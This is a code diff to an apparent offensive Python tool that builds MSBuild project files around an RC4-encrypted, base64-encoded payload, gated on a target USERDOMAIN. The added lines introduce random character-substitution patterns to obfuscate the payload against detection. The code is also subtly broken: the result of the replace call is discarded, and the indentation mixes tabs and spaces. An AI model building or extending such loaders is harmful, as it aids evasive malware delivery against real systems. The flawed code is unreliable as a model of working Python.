@@ -122,7 +122,9 @@ class Generator:
 			return data.replace("[CONDITION]", "")
 		else:
 			return data.replace("[CONDITION]", ' Condition="\'$(USERDOMAIN)\'==\'%s\'"' % value)
-
+   	@staticmethod
+    	def gen_pattern(charset):	
+		return ''.join(random.sample(charset,len(charset)))
 class RC4:
 
 	def KSA(self, key):
@@ -182,8 +184,14 @@ if __name__ == "__main__":
 		
 		outfile = gen.capture_input("Path for the generated MsBuild out file", 2)
 		cipher = base64.b64encode(rc4.Encrypt(data, key))
+		
+		pattern1 = Generator.gen_pattern("#!@$%?&")
+		pattern2 = Generator.gen_pattern(",.<>)(*[]{}")	
+		cipher.replace("m", pattern1).replace("V", pattern2)
+		
 		output = gen.get_output()
 		output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
+		output = output.replace("[PATTERN_1]", pattern1).replace("[PATTERN_2]", pattern2)
 		condition = gen.capture_input("Set USERDOMAIN condition (Default '')", 4).strip()
 		output = gen.set_condition(output, condition)
 		
